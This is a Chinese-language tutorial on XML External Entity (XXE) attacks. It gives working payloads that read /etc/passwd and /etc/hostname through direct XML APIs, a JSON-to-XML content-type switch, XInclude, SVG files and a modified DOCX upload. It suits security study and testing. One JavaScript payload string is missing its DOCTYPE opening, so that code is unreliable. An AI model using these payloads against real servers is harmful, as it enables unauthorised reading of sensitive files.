# XML 外部实体（XXE）

XXE 通常可归类为安全配置错误问题。几乎所有 XXE 攻击漏洞都是由于 API 端点接受 XML（或类 XML）载荷而发现的。根本原因在于 XML 解析器允许在没有验证的情况下加载和解析外部实体。因此，在处理这些实体时，XML 解析器可能被欺骗访问内部数据。

XXE 攻击的核心在于：XML 规范包含一个用于导入外部文件的特殊注解。这个特殊指令称为**外部实体**，在解析 XML 文件的机器上被解释。

这意味着，一个特制的 XML 载荷发送到服务器的 XML 解析器，可能允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。

在某些情况下，攻击者可以通过利用 XXE 漏洞执行服务器端请求伪造（SSRF）攻击，从而将 XXE 攻击升级为攻陷底层服务器或其他后端基础设施。

## XXE 基础知识

每个 XXE 攻击的核心都是 XML 规范及其在处理所谓“实体”方面的弱点。XML 实体是用于引用 XML 文件内或 XML 规范内另一段数据的字符集。您可能见过诸如 `&amp;` 或 `&lt;` 这样的 XML 实体，它们分别引用与符号（`&`）和小于号（`<`）。这些被称为**预定义实体**，因为它们始终引用相同的 ASCII 字符。

在 XML 文档中可以引用的更危险的实体形式是**自定义实体**。这些实体可以引用程序员定义的广泛数据，包括当前 XML 文档之外的数据。

XML **外部实体**是一种自定义 XML 实体类型，其定义的值从声明它的 DTD 外部加载，它是 XXE 式攻击的核心。外部实体从安全角度来看特别有趣，因为它们允许基于文件路径或 URL 的内容来定义实体。通过在 XML 文档类型定义（DTD）中引用外部实体，可以在解析之前将外部文件拉入 XML 文件。考虑以下示例：

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>
```

此示例实体引用文件 `etc/passwd`，其中包含有关 Linux 系统用户账户的敏感信息。XXE 攻击利用这些外部引用来泄露敏感信息、修改预期的应用功能，有时甚至启用远程代码执行。

## 直接 XXE —— 对接 XML API

在直接 XXE 中，一个带有外部实体标志的 XML 对象被发送到服务器。然后它被解析，并返回一个包含外部实体的结果

许多应用程序使用XML数据在HTTP消息中传输信息。要查找这些端点，你可以打开代理并浏览目标应用程序。然后，通过查找前面提到的树状结构，或通过查找XML文档的特征——字符串`"<?xml"`，在HTTP消息中找到类似XML的文档。

同时注意应用程序中编码的XML数据。有时应用程序使用base64或URL编码的XML数据以便于传输。你可以通过解码任何看起来可疑的数据块来找到这些XML入口点。例如，XML代码的base64编码块往往以`LD94bWw`开头，这是`"<?xml"`的base64编码字符串。

假设 mega-bank.com 有一个截图实用程序，允许您直接将银行门户的截图发送给客户支持。在客户端，它看起来像这样：

```html
<!--
一个简单的按钮。点击时调用函数 `screenshot()`。
-->
<button class="button"
        id="screenshot-button"
        onclick="screenshot()">
  发送截图给支持
</button>
```

```javascript
/*
 * 从 `content` 元素收集 HTML DOM，并调用 XML 解析器将 DOM 文本转换为 XML。
 *
 * 通过 HTTP 将 XML 发送到一个函数，该函数将从提供的 XML 生成截图。
 *
 * 将截图发送给支持人员以供进一步分析。
 */
const screenshot = function() {
  try {
    /*
     * 尝试将 `content` 元素转换为 XML。
     * 如果此过程失败则捕获——通常应该成功，因为 HTML 是 XML 的子集。
     */
    const div = document.getElementById('content').innerHTML;
    const serializer = new XMLSerializer();
    const dom = serializer.serializeToString(div);

    /*
     * 一旦 DOM 转换为 XML，生成一个请求到某个端点，
     * 该端点将 XML 转换为图像。因此产生截图。
     */
    const xhr = new XMLHttpRequest();
    const url = 'https://util.mega-bank.com/screenshot';
    const data = new FormData();
    data.append('dom', dom);

    /*
     * 如果 XML -> 图像的转换成功，
     * 则将截图发送给支持进行分析。
     *
     * 否则提醒用户该过程失败。
     */
    xhr.onreadystatechange = function() {
      sendScreenshotToSupport(xhr.responseText, (err) => {
        if (err) { alert('could not send screenshot.'); }
        else { alert('screenshot sent to support!'); }
      });
    }
    xhr.send(data);
  } catch (e) {
    /*
     * 如果用户的浏览器不兼容此功能，则警告用户。
     */
    alert('Your browser does not support this functionality. Consider upgrading.');
  }
};
```

这个功能很简单：用户点击一个按钮，将他们的困难截图发送给支持人员。其编程方式也不复杂：

1. 浏览器将当前用户的视图（通过 DOM）转换为 XML。
2. 浏览器将此 XML 发送到一个将其转换为 JPG 的服务。
3. 浏览器通过另一个 API 将该 JPG 发送给 MegaBank 支持人员。

当然，这段代码不止一个问题。例如，我们可以用我们自己的图像调用 `sendScreenshotToSupport()` 函数。验证图像内容的合法性比验证 XML 要困难得多，而且虽然将 XML 转换为图像很容易，但图像转 XML 则更难，因为您会失去上下文（div 名称、ID 等）。

在服务器上，一个名为 `screenshot` 的路由与我们浏览器发起的请求相对应：

```javascript
import xmltojpg from './xmltojpg';

/*
 * 将 XML 对象转换为 JPG 图像。
 *
 * 将图像数据返回给请求者。
 */
app.post('/screenshot', function(req, res) {
  if (!req.body.dom) { return res.sendStatus(400); }

  xmltojpg.convert(req.body.dom)
    .then((err, jpg) => {
      if (err) { return res.sendStatus(400); }
      return res.send(jpg);
    });
});
```

要将 XML 文件转换为 JPG 文件，必须经过 XML 解析器。要成为有效的 XML 解析器，它必须遵循 XML 规范。

我们的客户端发送给服务器的载荷只是将 HTML/DOM 集合转换为 XML 格式以便于解析。在正常使用情况下，它几乎不会做任何危险的事情。

然而，客户端发送的 DOM 确实可以被更懂技术的用户修改。或者，我们也可以直接伪造网络请求，向我们自己的定制载荷发送到服务器：

```javascript
import utilAPI from './utilAPI';

/*
 * 生成一个新的 XML HTTP 请求，目标为 XML -> JPG 实用 API。
 */
const xhr = new XMLHttpRequest();
xhr.open('POST', utilAPI.url + '/screenshot');
xhr.setRequestHeader('Content-Type', 'application/xml');

/*
 * 提供一个手动构造的 XML 字符串，利用许多 XML 解析器中的外部实体功能。
 */
const rawXMLString = `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;

xhr.onreadystatechange = function() {
  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
    // 在此处检查响应数据
  }
}

/*
 * 将请求发送到 XML -> JPG 实用 API 端点。
 */
xhr.send(rawXMLString);
```

当服务器收到此请求时，其解析器将评估 XML，然后在响应中向我们返回一个图像（JPG）。如果 XML 解析器没有明确禁用外部实体，我们应该会在返回的截图中看到 `/etc/passwd` 的基于文本的文件内容。


### XXE JSON 转 XML —— 服务器 API 接受多种格式

在某些服务器配置中，可能能够将当前类型数据（JSON、表单格式）转换为 XML 格式。尝试通过将 `Content-Type` 头从 `application/json`、`application/x-www-form-urlencoded` 更改为 `application/xml`，然后将当前数据结构转换为其 XML 等效项。

**示例：JSON 输入**
```json
{
    "book": {
        "bookName": "The Great Gatsby",
        "author": "F. Scott Fitzgerald",
    }
}
```

**带有 XXE 的恶意 JSON 转换为 XML：**
```xml
<?xml version="1.0"?>
<!DOCTYPE book [
    <!ELEMENT book ANY>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<book>
    <bookName>&xxe;</bookName>
    <author>F. Scott Fitzgerald</author>
</book>
```

## 间接 XXE —— 输入被服务器转换为或插入到 XML 格式并作用于后端组件

在间接 XXE 中，作为某种形式请求的结果，服务器生成一个 XML 对象。该 XML 对象包含用户提供的参数，可能导致包含外部实体标签

有时 XXE 攻击可用于一个不直接操作用户提交的 XML 对象的端点。当我们遇到一个接受类 XML 对象作为参数的 API 时，很自然会首先考虑尝试通过 XXE 攻击载荷引用外部实体。然而，仅仅因为一个 API 不接受 XML 对象作为其载荷的一部分，并不意味着它不使用 XML 解析器。

考虑以下用例。开发人员正在编写一个应用，通过 REST API 端点仅从用户请求一个参数。此应用旨在将该参数与公司已使用的企业级 CRM 软件包同步。

CRM 公司可能期望其 API 使用 XML 载荷，这意味着尽管公开暴露的载荷不接受 XML，但为了服务器能与 CRM 软件包正常通信，用户载荷必须通过 REST 服务器转换为 XML 对象，然后发送到 CRM 软件。

这通常发生在后台，这可能使黑客很难推断出有任何 XML 被使用。不幸的是，这实际上非常常见。随着企业软件（或依赖软件）公司的成长，他们通常以零碎方式升级软件，而不是全部从头构建。这意味着许多时候，现代 JSON/REST API 实际上会在某个时刻与 XML/SOAP API 对接。世界各地许多公司都将现代外观的软件和遗留软件系统拼凑在一起，而这些集成通常充满了深层安全漏洞，易于利用。

在前面的例子中，我们的非 XML 载荷会在服务器上被转换为 XML，然后发送到另一个软件系统。但如果没有内部知识，我们如何检测到这种情况正在发生呢？

一种方法是对您正在测试其 Web 应用的公司进行背景研究，以确定他们有哪些大型企业许可协议。有时，这些甚至是公开知识。

也可能查看他们托管的其他网页，看是否有数据通过不属于该公司的单独系统或 URL 呈现。

此外，许多旧的从 CRM 到会计或 HR 的企业软件包对其可存储数据的结构有限制。通过了解这些集成软件包的预期数据类型，如果面向公众的 API 在通过网络发送数据之前期望异常的数据格式，您可能能够推断出它们的使用。

### XInclude 攻击

一些应用程序接收客户端提交的数据，将其嵌入服务器端的 XML 文档中，然后解析该文档。这种情况的一个例子是当客户端提交的数据被放入后端 SOAP 请求中，然后由后端 SOAP 服务处理。在这种情况下，你无法执行经典的 XXE 攻击，因为你无法控制整个 XML 文档，因此无法定义或修改 `DOCTYPE` 元素。

此时仍可能执行**XInclude攻击**。XInclude是一种特殊的XML功能，它从作为子文档标签的 `xi:include` 构建 XML 文档。`XInclude` 攻击可用于 XML 文档中的任何单项数据

`XInclude` 攻击示例：

```xml
<example xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</example>
```
1. 引用 `http://www.w3.org/2001/XInclude` 命名空间，以便之后使用`xi:include` 元素。
2. 使用此元素解析并在XML文档中包含目标文件 `/etc/hostname`
3. `XInclude` 默认将包含的文档作为 XML 进行解析，设置解析属性 `parse="text"` 以修改默认行为

## 通过文件解析实现 XXE

一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件（如 SVG、DOCX、XLSX 等）。文件上传端点和文件解析器通常不受与常规端点相同的XXE保护机制保护。

### 通过 SVG 实现 XXE

要在SVG图像中嵌入XXE载荷，你首先需要将图像作为文本文件打开。以这个圆圈 SVG 图像为例：

```xml
<svg 
    xmlns="http://www.w3.org/2000/svg"
    width="500" 
    height="500">
    <circle cx="50" cy="50" r="40" fill="grey" />
    <circle cx="300" cy="50" r="40" fill="blue" />
</svg>
```

通过直接在文件中添加DTD并在SVG图像中引用外部实体来插入XXE载荷。然后你可以将文件保存为`.svg`文件并上传到服务器：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
    <!ENTITY test SYSTEM "file:///etc/hostname">
]>
<svg 
    xmlns="http://www.w3.org/2000/svg"
    width="500" 
    height="500">
    <circle cx="50" cy="50" r="40" fill="grey" />
    <circle cx="300" cy="50" r="40" fill="blue" />
    <text x="50" y="50" font-size="50" fill="red">&test;</text>
</svg>
```
- 文字坐标在字体左下方，向右下方移动以在边框内显示文字

在此 SVG 中，实体 `&test;` 被定义为获取 `/etc/hostname` 的内容。如果应用程序处理此 SVG 并解析外部实体，则 `/etc/hostname` 文件的内容将作为文本显示在 SVG 图像中。

### 通过 DOCX、XLSX 和 ZIP 实现 XXE

Office 文件（如 DOCX 和 XLSX）本质上是包含多个 XML 文件的 ZIP 文件。如果攻击者将 XXE 有效载荷嵌入这些 XML 文件中，并且服务器端的 XML 解析器未阻止引用外部实体，则可能导致利用 XXE 漏洞。

**步骤 1**：打开 word 文件并编写一些内容，如“Hello, this is a tmgm”，并将其保存为 tmgm.docx。

**步骤 2**：将 `.docx` 扩展名重命名为 `.zip` 并解压内容。

**步骤 3**：导航到 `word` 目录并打开 `document.xml` 文件。

**步骤 4**：在 `document.xml` 文件的顶部，主 XML 内容之前，插入以下有效载荷：
```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

**步骤 5**：接下来，找到文本“Hello, this is a tmgm”并将其替换为 `&xxe;`。保存并关闭文件。

**步骤 6**：现在将内容重新打包为 ZIP 文件，并将扩展名改回 `.docx`。

**步骤 7**：接下来，将此恶意 DOCX 文件上传到目标位置。

相同的方法可应用于 XLSX 文件，通过修改 ZIP 存档中的相应 XML 文件。
